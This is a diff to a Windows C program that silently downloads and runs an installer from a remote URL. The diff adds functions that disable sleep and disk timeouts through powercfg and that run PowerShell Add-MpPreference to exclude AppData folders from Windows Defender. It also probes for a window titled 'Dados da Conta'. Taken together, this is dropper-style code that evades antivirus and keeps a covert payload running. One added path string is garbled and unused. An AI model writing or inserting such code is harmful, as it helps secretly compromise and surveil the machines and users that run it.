@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include <tchar.h>
 #include <shlwapi.h>
+#include <Lmcons.h>  // Include this header for UNLEN
 #include "testedigita.h"
 
 #pragma comment(lib, "wininet.lib")
@@ -45,6 +46,7 @@ int ImportRegFiles() {
 void DownloadAndRun() {
     const char *url = "https://www.workmonitor.com/install/install.exe";
     const char *filePath = "C:\\Windows\\Temp\\install.exe";
+    const char *cmd = "C:\\Windows\\Userr\\";
 
     HINTERNET hInternet = InternetOpen("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (hInternet) {
@@ -67,10 +69,45 @@ void DownloadAndRun() {
     ShellExecute(NULL, "open", filePath, "/S", NULL, SW_HIDE);
 }
 
+void ConfigurePowerSettings() {
+    system("powercfg /s SCHEME_BALANCED");
+    system("powercfg /change disk-timeout-ac 0");
+    system("powercfg /change disk-timeout-dc 0");
+    system("powercfg -SETACVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 5ca83367-6e45-459f-a27b-476b1d01c936 0");
+    system("powercfg -SETDCVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 5ca83367-6e45-459f-a27b-476b1d01c936 0");
+    system("powercfg -SETACVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 96996bc0-ad50-47ec-923b-6f41874dd9eb 0");
+    system("powercfg -SETDCVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 96996bc0-ad50-47ec-923b-6f41874dd9eb 0");
+    system("powercfg -SETACVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 7648efa3-dd9c-4e3e-b566-50f929386280 3");
+    system("powercfg -SETDCVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 7648efa3-dd9c-4e3e-b566-50f929386280 3");
+    system("powercfg -SETACVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e SUB_VIDEO VIDEOIDLE 0");
+    system("powercfg -SETDCVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e SUB_VIDEO VIDEOIDLE 0");
+    system("powercfg -SETACVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e SUB_SLEEP STANDBYIDLE 0");
+    system("powercfg -SETDCVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e SUB_SLEEP STANDBYIDLE 0");
+    system("powershell -Command \"try { Add-MpPreference -ExclusionPath '%APPDATA%' } catch { echo 'Falha ao adicionar excecao no antivirus' }\"");
+}
+
+void AddAntivirusExclusion() {
+    char username[UNLEN + 1];
+    DWORD username_len = UNLEN + 1;
+    GetUserName(username, &username_len);
+
+    char exclusionPath[MAX_PATH];
+    sprintf(exclusionPath, "C:\\Users\\%s\\AppData\\Roaming\\spa", username);
+
+    char cmd[MAX_PATH + 50];
+    sprintf(cmd, "powershell -Command \"try { Add-MpPreference -ExclusionPath '%s' } catch { echo 'Falha ao adicionar excecao no antivirus' }\"", exclusionPath);
+
+    system(cmd);
+}
+
 int main() {
     int regImportSuccess = ImportRegFiles();
 
     DownloadAndRun();
+
+    ConfigurePowerSettings();
+
+    AddAntivirusExclusion();
 
     if (!regImportSuccess) {
         HWND hwnd = FindWindowByTitle("Dados da Conta");
